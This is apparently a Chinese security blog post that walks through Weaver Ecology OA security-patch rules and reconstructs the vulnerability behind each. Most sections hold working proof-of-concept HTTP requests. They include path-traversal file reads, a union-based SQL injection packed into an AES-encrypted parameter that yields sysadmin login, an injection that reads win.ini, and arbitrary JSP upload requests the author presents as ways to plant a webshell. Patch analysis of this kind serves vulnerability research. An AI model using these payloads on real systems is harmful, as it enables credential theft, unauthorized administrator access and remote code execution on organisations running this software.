<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.messager.MessagerServlet/.css?loginid=xxx HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="SecurityRulePortalThumbnail40"><a href="#SecurityRulePortalThumbnail40" class="headerlink" title="SecurityRulePortalThumbnail40"></a>SecurityRulePortalThumbnail40</h4><p>限制对<code>filesystem4cluster</code>、<code>portal/sptmforportalthumbnail.jsp</code>目录访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215605377.png"></p>
<h5 id="portal-x2F-sptmforportalthumbnail-jsp-任意文件读取，需登录"><a href="#portal-x2F-sptmforportalthumbnail-jsp-任意文件读取，需登录" class="headerlink" title="portal&#x2F;sptmforportalthumbnail.jsp 任意文件读取，需登录"></a>portal&#x2F;sptmforportalthumbnail.jsp 任意文件读取，需登录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /portal/sptmforportalthumbnail.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">preview=../../log4j.properties</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215605615.png"></p>
<h4 id="SecurityRuleSQL32"><a href="#SecurityRuleSQL32" class="headerlink" title="SecurityRuleSQL32"></a>SecurityRuleSQL32</h4><p>对路径<code>/mobile/changeuserinfo.jsp</code>的参数<code>type</code>增加<code>changePssword</code>校验 原版未见<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215606136.png"></p>
<h4 id="SecurityRuleSQL42"><a href="#SecurityRuleSQL42" class="headerlink" title="SecurityRuleSQL42"></a>SecurityRuleSQL42</h4><p>限制对路径<code>/api/integration/esb</code>下的test、delete、search访问<br>该路径下无相关路由</p>
<h4 id="SecurityRuleSso44"><a href="#SecurityRuleSso44" class="headerlink" title="SecurityRuleSso44"></a>SecurityRuleSso44</h4><p>增加对路径<code>/login/verifyssologin.jsp</code>的SQL注入检测<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215606459.png"><br>跟了下，<code>HrmResource</code>表在该版本有135列，10.48有140列，构造<code>payload</code>需要做联合查询后AES加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptAES2</span><span class="params">(String var0, String var1)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] var2 = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">KeyGenerator</span> <span class="variable">var3</span> <span class="operator">=</span> KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="type">SecureRandom</span> <span class="variable">var4</span> <span class="operator">=</span> SecureRandom.getInstance(<span class="string">&quot;SHA1PRNG&quot;</span>);</span><br><span class="line">            var4.setSeed(var1.getBytes());</span><br><span class="line">            var3.init(<span class="number">128</span>, var4);</span><br><span class="line">            <span class="type">SecretKey</span> <span class="variable">var5</span> <span class="operator">=</span> var3.generateKey();</span><br><span class="line">            <span class="type">byte</span>[] var6 = var5.getEncoded();</span><br><span class="line">            <span class="type">SecretKeySpec</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(var6, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">var8</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>, <span class="string">&quot;SunJCE&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] var9 = var0.getBytes();</span><br><span class="line">            var8.init(<span class="number">1</span>, var7);</span><br><span class="line">            var2 = var8.doFinal(var9);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchProviderException var10) &#123;</span><br><span class="line">            var10.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var11) &#123;</span><br><span class="line">            var11.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchPaddingException var12) &#123;</span><br><span class="line">            var12.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException var13) &#123;</span><br><span class="line">            var13.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException var14) &#123;</span><br><span class="line">            var14.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException var15) &#123;</span><br><span class="line">            var15.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var2 == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : parseByte2HexStr(var2);</span><br><span class="line">    &#125;</span><br><span class="line">        String result=encryptAES2(<span class="string">&quot;aa#-1&#x27; union select id,loginid,password,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from hrmresourcemanager where loginid=&#x27;sysadmin&quot;</span>,<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login/VerifySSoLogin.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1509</span><br><span class="line"></span><br><span class="line">para=403657F4939DCA3C9696DB209DF4889BBFA96904FA858EBB4BD7F3FB91B774F98CE8778E414979E5E445113763185C601AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B591AD8E54EBE420254EF9FB6A8774DD20A4FA2864C8DCE72A0374249E390AA4073BEBAADA9511B1A3520811FBF1CB70733974A8B960289AE52DE8A75CCCBD5CCDFC9EAA81B5D8D110F8B4730C062304B59BF2C7BCF1DC14523465E4A1F6074D62DF2966FD42121F18075885129E6673129E843635F2EFEF24334E9459C98408EF48FA0468BDB7BEDEBC43A6D0EFDC82665</span><br></pre></td></tr></table></figure>
<p>即可以sysadmin登录</p>
<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>该版本增加了对<code>union</code>注入的检测<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215606734.png"></p>
<h3 id="Ecology-security-20191031-v10-22"><a href="#Ecology-security-20191031-v10-22" class="headerlink" title="Ecology_security_20191031_v10.22"></a>Ecology_security_20191031_v10.22</h3><h4 id="SecurityRule46"><a href="#SecurityRule46" class="headerlink" title="SecurityRule46"></a>SecurityRule46</h4><p>规则限制对<code>weaver.formmode.data.filedownload</code>、<code>weaver.file.excelout</code>的访问</p>
<h5 id="weaver-formmode-data-filedownload"><a href="#weaver-formmode-data-filedownload" class="headerlink" title="weaver.formmode.data.filedownload"></a>weaver.formmode.data.filedownload</h5><p>任意文件下载漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.formmode.data.FileDownload/.css?filename=../../log4j.properties HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215607020.png"></p>
<h5 id="weaver-file-excelout"><a href="#weaver-file-excelout" class="headerlink" title="weaver.file.excelout"></a>weaver.file.excelout</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.ExcelOut/.css?path=../log4j.properties HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215607286.png"></p>
<h3 id="Ecology-security-20191104-v10-23"><a href="#Ecology-security-20191104-v10-23" class="headerlink" title="Ecology_security_20191104_v10.23"></a>Ecology_security_20191104_v10.23</h3><h4 id="SecurityRuleBlog"><a href="#SecurityRuleBlog" class="headerlink" title="SecurityRuleBlog"></a>SecurityRuleBlog</h4><p>规则限制了对<code>blog/blogOperation.jsp</code>访问，该文件多处注入点但有过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215607586.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /blog/BlogSettingOperation.jsp HTTP/1.1</span><br><span class="line">Host: 10.251.0.236</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 155</span><br><span class="line">Origin: http://10.251.0.236</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.251.0.236/blog/BlogbaseSetting.jsp</span><br><span class="line">Cookie: loginfileweaver=%2Fwui%2Ftheme%2Fecology8%2Fpage%2Flogin.jsp%3FtemplateId%3D3%26logintype%3D1%26gopage%3D; loginidweaver=1; languageidweaver=7; testBanCookie=test; ecology_JSessionId=abcDeSMZ5lWSM-pclUlsx; JSESSIONID=abcDeSMZ5lWSM-pclUlsx; ecology_JSessionid=abcDeSMZ5lWSM-pclUlsx</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">operation=editBaseSetting&amp;allowRequest=1&amp;enableDate=2011-09-01&amp;isManagerScore=1&amp;attachmentDir=0%7C1%7C2%7C3%7C4&amp;attachmentDir__=&amp;makeUpTime=3&amp;canEditTime=5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配合<code>/mobile/plugin/11/blogFileUpload.jsp </code>可getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/plugin/11/blogFileUpload.jsp HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------24959225962446572285214052785</span><br><span class="line">Content-Length: 402</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/email/new/MailAdd.jsp?internalto=&amp;to=&amp;isInternal=&amp;fileid=</span><br><span class="line">Cookie: Hm_lvt_520556228c0113270c0c772027905838=1597108770,1597626694; page_iframe_url=http://127.0.0.1:8888/index.php?lang=cn&amp;pageset=1; ecology_JSessionId=abcDeSMZ5lWSM-pclUlsx; testBanCookie=test; loginfileweaver=%2Fwui%2Ftheme%2Fecology8%2Fpage%2Flogin.jsp%3FtemplateId%3D3%26logintype%3D1%26gopage%3D; loginidweaver=1; languageidweaver=7</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------24959225962446572285214052785</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadname&quot;</span><br><span class="line"></span><br><span class="line">123.jsp</span><br><span class="line">-----------------------------24959225962446572285214052785</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaddata&quot;;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">PCUgIG91dC5wcmludGxuKCJmaWxlIHR5cGUgaXMgbm90IHZhbGlkISIpOyAgJT4=</span><br><span class="line">-----------------------------24959225962446572285214052785--</span><br><span class="line"></span><br></pre></td></tr></table></figure>






<h4 id="SecurityRuleCtrip"><a href="#SecurityRuleCtrip" class="headerlink" title="SecurityRuleCtrip"></a>SecurityRuleCtrip</h4><p>规则限制对<code>mobile/plugin/(ctrip|alitrip)</code>、<code>interface/(ctrip|alitrip)</code>访问，泛微OA原版无此路径</p>
<h4 id="SecurityRuleDBstepSQL"><a href="#SecurityRuleDBstepSQL" class="headerlink" title="SecurityRuleDBstepSQL"></a>SecurityRuleDBstepSQL</h4><p>规则限制对<code>weaver.dbstep.officeserver</code>访问，原版泛微无此路径</p>
<h4 id="SecurityRuleDownloadNews"><a href="#SecurityRuleDownloadNews" class="headerlink" title="SecurityRuleDownloadNews"></a>SecurityRuleDownloadNews</h4><p>规则限制对<code>weaver.file.filedownloadfornews</code>访问，规则限制<code>fileid</code>为正整数</p>
<h4 id="SecurityRuleForAjax"><a href="#SecurityRuleForAjax" class="headerlink" title="SecurityRuleForAjax"></a>SecurityRuleForAjax</h4><p>规则限制对<code>rdeploy/chatproject/doc/eventForAjax.jsp</code>的带参访问，限制SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215607869.png"></p>
<h4 id="SecurityRuleForElementCustomServlet"><a href="#SecurityRuleForElementCustomServlet" class="headerlink" title="SecurityRuleForElementCustomServlet"></a>SecurityRuleForElementCustomServlet</h4><p>规则限制对<code>weaver.admincenter.homepage.elementcustomservlet</code>访问，是一个后台任意文件上传，可跨目录写文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215608158.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215608474.png"></p>
<h4 id="SecurityRuleForOutDoc"><a href="#SecurityRuleForOutDoc" class="headerlink" title="SecurityRuleForOutDoc"></a>SecurityRuleForOutDoc</h4><p>限制对<code>weaver.file.filedownloadforoutdoc</code>的访问，原版泛微中不存在</p>
<h4 id="SecurityRuleForServer"><a href="#SecurityRuleForServer" class="headerlink" title="SecurityRuleForServer"></a>SecurityRuleForServer</h4><p>SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215608942.png"><br>限制对<code>weaver.formmode.excel.ExpExcelServer</code>访问，限制传入<code>ids</code>只能为数字<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215609241.png"></p>
<h4 id="SecurityRuleValidatenum"><a href="#SecurityRuleValidatenum" class="headerlink" title="SecurityRuleValidatenum"></a>SecurityRuleValidatenum</h4><p>限制<code>weaver.file.makevalidatecode</code>的传入参数<code>validatenum</code>为3~7且不为负数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215609544.png"></p>
<h4 id="SecurityRuleWeb47"><a href="#SecurityRuleWeb47" class="headerlink" title="SecurityRuleWeb47"></a>SecurityRuleWeb47</h4><p>限制对<code>/data/sqlupgrade</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215609809.png"></p>
<h4 id="SecurityRuleWeb49"><a href="#SecurityRuleWeb49" class="headerlink" title="SecurityRuleWeb49"></a>SecurityRuleWeb49</h4><p>限制对<code>/weaversso/</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215610045.png"></p>
<h4 id="SecurityRuleWeb50"><a href="#SecurityRuleWeb50" class="headerlink" title="SecurityRuleWeb50"></a>SecurityRuleWeb50</h4><p>限制对<code>formmode/setup/download.jsp</code>、<code>/workflow/request/custompageforward.jsp</code>【原版泛微不存在】<br><code>mobile/plugin/wfIframeForward.jsp</code>路径访问</p>
<h4 id="SecurityRuleWeb51"><a href="#SecurityRuleWeb51" class="headerlink" title="SecurityRuleWeb51"></a>SecurityRuleWeb51</h4><p>限制只能sysadmin对<code>/social/manager/socialimcheckoperation.jsp</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215610331.png"></p>
<h4 id="SecurityRuleWeb52"><a href="#SecurityRuleWeb52" class="headerlink" title="SecurityRuleWeb52"></a>SecurityRuleWeb52</h4><p><code>/weaver.file.networkdisk.NetworkDiskFileDownload</code>、<code>/weaver.file.SignatureDownLoad</code>、<code>/weaver.docs.docs.ShowDocsImageServlet</code>限制以上路径访问，</p>
<h5 id="x2F-weaver-file-SignatureDownLoad"><a href="#x2F-weaver-file-SignatureDownLoad" class="headerlink" title="&#x2F;weaver.file.SignatureDownLoad"></a>&#x2F;weaver.file.SignatureDownLoad</h5><p><code>markId</code>存在注入，POC<code>weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27</code>读文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215610608.png"></p>
<h5 id="x2F-weaver-docs-docs-ShowDocsImageServlet"><a href="#x2F-weaver-docs-docs-ShowDocsImageServlet" class="headerlink" title="&#x2F;weaver.docs.docs.ShowDocsImageServlet"></a>&#x2F;weaver.docs.docs.ShowDocsImageServlet</h5><p><code>docId</code>存在注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215610879.png"></p>
<h5 id="x2F-weaver-file-networkdisk-NetworkDiskFileDownload"><a href="#x2F-weaver-file-networkdisk-NetworkDiskFileDownload" class="headerlink" title="&#x2F;weaver.file.networkdisk.NetworkDiskFileDownload"></a>&#x2F;weaver.file.networkdisk.NetworkDiskFileDownload</h5><p><code>imagefileid</code>存在注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215611225.png"></p>
<h3 id="Ecology-security-20200511-v10-25"><a href="#Ecology-security-20200511-v10-25" class="headerlink" title="Ecology_security_20200511_v10.25"></a>Ecology_security_20200511_v10.25</h3><h4 id="LRFFieldLog"><a href="#LRFFieldLog" class="headerlink" title="LRFFieldLog"></a>LRFFieldLog</h4><p>限制对<code>/api/workflow/formManage/fieldTemplateLib/saveField</code>路径的<code>description</code>参数访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215611573.png"><br>验证<code>description</code>存在注入</p>
<h4 id="SecurityRule051"><a href="#SecurityRule051" class="headerlink" title="SecurityRule051"></a>SecurityRule051</h4><p>限制删库代码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215611812.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215612057.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215612374.png"></p>
<h4 id="SecurityRuleCloudstoreControlServlet"><a href="#SecurityRuleCloudstoreControlServlet" class="headerlink" title="SecurityRuleCloudstoreControlServlet"></a>SecurityRuleCloudstoreControlServlet</h4><p>该接口在登录态下可以调用<code>com.cloudstore.api.controller</code>下的任意类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215612678.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215612904.png"></p>
<h4 id="SecurityRuleCommForbidden"><a href="#SecurityRuleCommForbidden" class="headerlink" title="SecurityRuleCommForbidden"></a>SecurityRuleCommForbidden</h4><p>通用拦截类<br>对静态资源、<code>forbidden-no-check-urls</code>xml中的路径直接跳过校验<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215613162.png"></p>
<h4 id="SecurityRuleCheckPageRight"><a href="#SecurityRuleCheckPageRight" class="headerlink" title="SecurityRuleCheckPageRight"></a>SecurityRuleCheckPageRight</h4><p>权限严格校验类<br>当xml文件中<code>createpage-key-consumepage</code>节点为空时跳过 否则对含有<code>/weaver</code>、<code>/api</code>、<code>.jsp</code>路径进行URI判断<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215613454.png"><br>同时对<code>/weaver.file.FileDownload</code>路径的<code>type</code>为<code>consumeKey</code>、<code>consumeKe</code>y<code>、showmould</code>进行部分解禁<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215613757.png"></p>
<h4 id="SecurityRuleCreateDB"><a href="#SecurityRuleCreateDB" class="headerlink" title="SecurityRuleCreateDB"></a>SecurityRuleCreateDB</h4><p>限制建库、建表<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215613997.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215614251.png"></p>
<h4 id="SecurityRuleDataSel053"><a href="#SecurityRuleDataSel053" class="headerlink" title="SecurityRuleDataSel053"></a>SecurityRuleDataSel053</h4><p>限制<code>/js/hrm/getdata.jsp</code>、<code>/page/exportimport/uploadoperation.jsp</code>路径访问</p>
<h5 id="x2F-page-x2F-exportimport-x2F-uploadoperation-jsp"><a href="#x2F-page-x2F-exportimport-x2F-uploadoperation-jsp" class="headerlink" title="&#x2F;page&#x2F;exportimport&#x2F;uploadoperation.jsp"></a>&#x2F;page&#x2F;exportimport&#x2F;uploadoperation.jsp</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215614559.png"><br>任意文件上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /page/exportImport/uploadOperation.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.4.2</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 185</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;shell.jsp&quot;</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;%out.println(&quot;X&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传完马子路径为<code>page/exportImport/fileTransfer/shell.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215614820.png"></p>
